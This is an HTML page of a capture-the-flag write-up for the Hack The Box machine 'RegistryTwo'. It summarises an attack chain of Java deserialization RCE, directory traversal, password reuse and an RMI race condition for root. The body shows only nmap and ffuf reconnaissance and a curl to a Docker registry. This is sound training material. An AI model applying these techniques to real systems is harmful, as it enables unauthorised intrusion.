<!doctype html><html lang="en"><head><title>RegistryTwo | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Insane machine. This machine exposes a web application that allows to create custom domains with HTML code. Moreover, there is a Docker registry exposed where we can download Docker image blobs after getting a suitable JWT token. The web application is running a WAR file with Tomcat, we can decompile it and see that it queries a RMI server. Since Tomcat is behind an nginx reverse proxy, we can access some sensitive Tomcat servlets to modify our session and set manager permissions on the web application. We need this to modify the RMI configuration using a mass assignment vulnerability and point the RMI server to us. After that, we can exploit an insecure deserialization vulnerability in Java to get RCE in a container. Then, we can interact with the legitimate RMI server using port forwarding. This server allows us to read arbitrary files with a directory traversal attack. We can find a plaintext password for user developer, which is reused in SSH. Then, root is executing a JAR file to analyze files of the hosting website by sending them to a ClamAV server. The problem here is that the JAR calls functions from the RMI register, which is restarted periodically. Therefore, we can craft a malicious RMI registry and exploit win a race condition to take the port, so that root queries our malicious registry and talks to our fake ClamAV server. The result is that all files at /root will be quarantined inside a readable directory, which leads to the privilege escalation"><meta name="image" content="https://7rocky.github.io/images/HTB/RegistryTwo/RegistryTwo.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Insane machine. This machine exposes a web application that allows to create custom domains with HTML code. Moreover, there is a Docker registry exposed where we can download Docker image blobs after getting a suitable JWT token. The web application is running a WAR file with Tomcat, we can decompile it and see that it queries a RMI server. Since Tomcat is behind an nginx reverse proxy, we can access some sensitive Tomcat servlets to modify our session and set manager permissions on the web application. We need this to modify the RMI configuration using a mass assignment vulnerability and point the RMI server to us. After that, we can exploit an insecure deserialization vulnerability in Java to get RCE in a container. Then, we can interact with the legitimate RMI server using port forwarding. This server allows us to read arbitrary files with a directory traversal attack. We can find a plaintext password for user developer, which is reused in SSH. Then, root is executing a JAR file to analyze files of the hosting website by sending them to a ClamAV server. The problem here is that the JAR calls functions from the RMI register, which is restarted periodically. Therefore, we can craft a malicious RMI registry and exploit win a race condition to take the port, so that root queries our malicious registry and talks to our fake ClamAV server. The result is that all files at /root will be quarantined inside a readable directory, which leads to the privilege escalation"><meta itemprop="keywords" content="java,nginx,docker,tomcat,cronjob,race-condition,lfr,port-forwarding,password-reuse,jwt,mass-assignment,reversing,static-code-analysis,rce,insecure-deserialization,directory-path-traversal,rmi,"><meta itemprop="name" content="RegistryTwo"><meta property="article:published_time" content="2024-02-03T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Insane machine. This machine exposes a web application that allows to create custom domains with HTML code. Moreover, there is a Docker registry exposed where we can download Docker image blobs after getting a suitable JWT token. The web application is running a WAR file with Tomcat, we can decompile it and see that it queries a RMI server. Since Tomcat is behind an nginx reverse proxy, we can access some sensitive Tomcat servlets to modify our session and set manager permissions on the web application. We need this to modify the RMI configuration using a mass assignment vulnerability and point the RMI server to us. After that, we can exploit an insecure deserialization vulnerability in Java to get RCE in a container. Then, we can interact with the legitimate RMI server using port forwarding. This server allows us to read arbitrary files with a directory traversal attack. We can find a plaintext password for user developer, which is reused in SSH. Then, root is executing a JAR file to analyze files of the hosting website by sending them to a ClamAV server. The problem here is that the JAR calls functions from the RMI register, which is restarted periodically. Therefore, we can craft a malicious RMI registry and exploit win a race condition to take the port, so that root queries our malicious registry and talks to our fake ClamAV server. The result is that all files at /root will be quarantined inside a readable directory, which leads to the privilege escalation"><meta property="og:image" content="https://7rocky.github.io/images/HTB/RegistryTwo/RegistryTwo.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="RegistryTwo"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/registrytwo/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Insane machine. This machine exposes a web application that allows to create custom domains with HTML code. Moreover, there is a Docker registry exposed where we can download Docker image blobs after getting a suitable JWT token. The web application is running a WAR file with Tomcat, we can decompile it and see that it queries a RMI server. Since Tomcat is behind an nginx reverse proxy, we can access some sensitive Tomcat servlets to modify our session and set manager permissions on the web application. We need this to modify the RMI configuration using a mass assignment vulnerability and point the RMI server to us. After that, we can exploit an insecure deserialization vulnerability in Java to get RCE in a container. Then, we can interact with the legitimate RMI server using port forwarding. This server allows us to read arbitrary files with a directory traversal attack. We can find a plaintext password for user developer, which is reused in SSH. Then, root is executing a JAR file to analyze files of the hosting website by sending them to a ClamAV server. The problem here is that the JAR calls functions from the RMI register, which is restarted periodically. Therefore, we can craft a malicious RMI registry and exploit win a race condition to take the port, so that root queries our malicious registry and talks to our fake ClamAV server. The result is that all files at /root will be quarantined inside a readable directory, which leads to the privilege escalation"><meta name="twitter:description" content="Hack The Box. Linux. Insane machine. This machine exposes a web application that allows to create custom domains with HTML code. Moreover, there is a Docker registry exposed where we can download Docker image blobs after getting a suitable JWT token. The web application is running a WAR file with Tomcat, we can decompile it and see that it queries a RMI server. Since Tomcat is behind an nginx reverse proxy, we can access some sensitive Tomcat servlets to modify our session and set manager permissions on the web application. We need this to modify the RMI configuration using a mass assignment vulnerability and point the RMI server to us. After that, we can exploit an insecure deserialization vulnerability in Java to get RCE in a container. Then, we can interact with the legitimate RMI server using port forwarding. This server allows us to read arbitrary files with a directory traversal attack. We can find a plaintext password for user developer, which is reused in SSH. Then, root is executing a JAR file to analyze files of the hosting website by sending them to a ClamAV server. The problem here is that the JAR calls functions from the RMI register, which is restarted periodically. Therefore, we can craft a malicious RMI registry and exploit win a race condition to take the port, so that root queries our malicious registry and talks to our fake ClamAV server. The result is that all files at /root will be quarantined inside a readable directory, which leads to the privilege escalation"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/RegistryTwo/RegistryTwo.webp"><meta name="twitter:title" content="RegistryTwo"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/registrytwo/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/registrytwo/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/registrytwo/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/registrytwo/&amp;text=RegistryTwo" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/registrytwo/&amp;title=RegistryTwo" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">RegistryTwo</h1><time class="mt4 f6 dib tracked" datetime="2024-02-03T00:00:00+01:00">03 / 02 / 2024</time><br><p class="mb4 f6 dib tracked">42 minutes to read</p></header><div class="htb-image"><img alt="RegistryTwo" src="/images/HTB/RegistryTwo/RegistryTwo.webp"><br><div class="htb-description bg-card">Hack The Box. Linux. Insane machine. This machine exposes a web application that allows to create custom domains with HTML code. Moreover, there is a Docker registry exposed where we can download Docker image blobs after getting a suitable JWT token. The web application is running a WAR file with Tomcat, we can decompile it and see that it queries a RMI server. Since Tomcat is behind an nginx reverse proxy, we can access some sensitive Tomcat <em>servlets</em> to modify our session and set manager permissions on the web application. We need this to modify the RMI configuration using a mass assignment vulnerability and point the RMI server to us. After that, we can exploit an insecure deserialization vulnerability in Java to get RCE in a container. Then, we can interact with the legitimate RMI server using port forwarding. This server allows us to read arbitrary files with a directory traversal attack. We can find a plaintext password for user <code>developer</code>, which is reused in SSH. Then, <code>root</code> is executing a JAR file to analyze files of the hosting website by sending them to a ClamAV server. The problem here is that the JAR calls functions from the RMI register, which is restarted periodically. Therefore, we can craft a malicious RMI registry and exploit win a race condition to take the port, so that <code>root</code> queries our malicious registry and talks to our fake ClamAV server. The result is that all files at <code>/root</code> will be quarantined inside a readable directory, which leads to the privilege escalation</div></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/java" title="Java">Java</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/nginx" title="nginx">nginx</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/tomcat" title="Tomcat">Tomcat</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cronjob" title="Cron jobs">Cron jobs</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/race-condition" title="Race condition">Race condition</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/lfr" title="Local File Read">Local File Read</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/port-forwarding" title="Port forwarding">Port forwarding</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-reuse" title="Password reuse">Password reuse</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/jwt" title="JSON Web Token">JSON Web Token</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/mass-assignment" title="Mass assignment">Mass assignment</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/reversing" title="Reverse Engineering">Reverse Engineering</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/static-code-analysis" title="Static Code Analysis">Static Code Analysis</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/insecure-deserialization" title="Insecure Deserialization">Insecure Deserialization</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/directory-path-traversal" title="Directory Path Traversal">Directory Path Traversal</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rmi" title="Remote Method Invocation">Remote Method Invocation</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#docker-registry">Docker registry</a></li><li><a href="#war-decompilation">WAR decompilation</a></li></ul></li><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#tomcat-and-nginx-exploitation">Tomcat and nginx exploitation</a></li></ul></li><li><a href="#rmi-exploitation">RMI exploitation</a></li><li><a href="#foothold">Foothold</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Insane</li><li><strong>IP Address</strong>: 10.10.11.223</li><li><strong>Release</strong>: 22 / 07 / 2023</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.94 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.223 -p 22,443,5000,5001
Nmap scan report for 10.10.11.223
Host is up (0.045s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa:b0:03:98:7e:60:c2:f3:11:82:27:a1:35:77:9f:d3 (RSA)
|   256 f2:59:06:dc:33:b0:9f:a3:5e:b7:63:ff:61:35:9d:c5 (ECDSA)
|_  256 e3:ac:ab:ea:2b:d6:8e:f4:1f:b0:7b:05:0a:69:a5:37 (ED25519)
443/tcp  open  ssl/http           nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to https://www.webhosting.htb/
| ssl-cert: Subject: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2023-02-01T20:19:22
|_Not valid after:  2024-02-01T20:19:22
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.14.0 (Ubuntu)
5000/tcp open  ssl/http           Docker Registry (API: 2.0)
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
|_http-title: Site doesn't have a title.
5001/tcp open  ssl/commplex-link?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
| tls-alpn:
|   h2
|_  http/1.1
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 25 Jul 2023 22:08:16 GMT
|     Content-Length: 10
|     found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:  
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Tue, 25 Jul 2023 22:07:49 GMT
|     Content-Length: 26
|_    &lt;h1&gt;Acme auth server&lt;/h1&gt;
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 108.34 seconds
</code></pre></div><p>This machine has ports 22 (SSH), 443 (HTTPS), 5000 and 5001 open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>https://10.10.11.223</code>, we are redirected to <code>https://www.webhosting.htb</code>. After adding <code>webhosting.htb</code> and <code>www.webhosting.htb</code> into <code>/etc/hosts</code>, we will see this landing page:</p><p><img alt="RegistryTwo 1" src="/images/HTB/RegistryTwo/RegistryTwo-1.webp"></p><p>Let&rsquo;s register an account:</p><p><img alt="RegistryTwo 2" src="/images/HTB/RegistryTwo/RegistryTwo-2.webp"></p><p><img alt="RegistryTwo 3" src="/images/HTB/RegistryTwo/RegistryTwo-3.webp"></p><p>And then log in:</p><p><img alt="RegistryTwo 4" src="/images/HTB/RegistryTwo/RegistryTwo-4.webp"></p><p><img alt="RegistryTwo 5" src="/images/HTB/RegistryTwo/RegistryTwo-5.webp"></p><p>Alright, we have access to our profile:</p><p><img alt="RegistryTwo 6" src="/images/HTB/RegistryTwo/RegistryTwo-6.webp"></p><p>We can notice that we are given a cookie named <code>JSESSIONID</code>, which indicates that the webserver is running Java (probably Tomcat, since the machine picture shows a cat holding a cup of coffee):</p><p><img alt="RegistryTwo 7" src="/images/HTB/RegistryTwo/RegistryTwo-7.webp"></p><p>Here we have the ability to create domains and HTML files:</p><p><img alt="RegistryTwo 8" src="/images/HTB/RegistryTwo/RegistryTwo-8.webp"></p><p><img alt="RegistryTwo 9" src="/images/HTB/RegistryTwo/RegistryTwo-9.webp"></p><p><img alt="RegistryTwo 10" src="/images/HTB/RegistryTwo/RegistryTwo-10.webp"></p><p>We can go to our profile and test the domain (after entering the domain in <code>/etc/hosts</code>):</p><p><img alt="RegistryTwo 11" src="/images/HTB/RegistryTwo/RegistryTwo-11.webp"></p><p><img alt="RegistryTwo 12" src="/images/HTB/RegistryTwo/RegistryTwo-12.webp"></p><h3 id="docker-registry">Docker registry</h3><p>Let&rsquo;s move one to the other ports for the moment. On port 5001 we find <code>Acme auth server</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k https://10.10.11.223:5001
&lt;h1&gt;Acme auth server&lt;/h1&gt;  
</code></pre></div><p>Let&rsquo;s apply fuzzing to enumerate more routes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u https://10.10.11.223:5001/FUZZ -k  

<span class="code-dark-green">[Status: 200, Size: 1330, Words: 1, Lines: 1, Duration: 45ms]</span>
    * FUZZ: auth

:: Progress: [43007/43007] :: Job [1/1] :: 1005 req/sec :: Duration: [0:00:41] :: Errors: 0 ::
</code></pre></div><p>Alright, we have another endpoint, which shows a JWT token (both <code>token</code> and <code>access_token</code> fields have the same value):</p><p><img alt="RegistryTwo 13" src="/images/HTB/RegistryTwo/RegistryTwo-13.webp"></p><p>If we apply fuzzing, we will see that this is a <a target="_blank" href="https://docs.docker.com/registry/">Docker registry</a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u https://10.10.11.223:5000/FUZZ -k

<span class="code-dark-blue">[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 36ms]</span>
    * FUZZ: .

<span class="code-dark-blue">[Status: 301, Size: 39, Words: 3, Lines: 3, Duration: 36ms]</span>
    * FUZZ: v2

:: Progress: [43007/43007] :: Job [1/1] :: 1025 req/sec :: Duration: [0:00:41] :: Errors: 0 ::

<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u https://10.10.11.223:5000/v2/FUZZ -k  

<span class="code-dark-blue">[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 37ms]</span>
    * FUZZ: .

<span class="code-dark-yellow">[Status: 401, Size: 145, Words: 2, Lines: 2, Duration: 40ms]</span>
    * FUZZ: _catalog

:: Progress: [43007/43007] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:41] :: Errors: 0 ::
</code></pre></div><p>If we try to access to <code>/v2/_catalog</code> we will get an authentication/authorization error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k https://10.10.11.223:5000/v2/_catalog
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}  
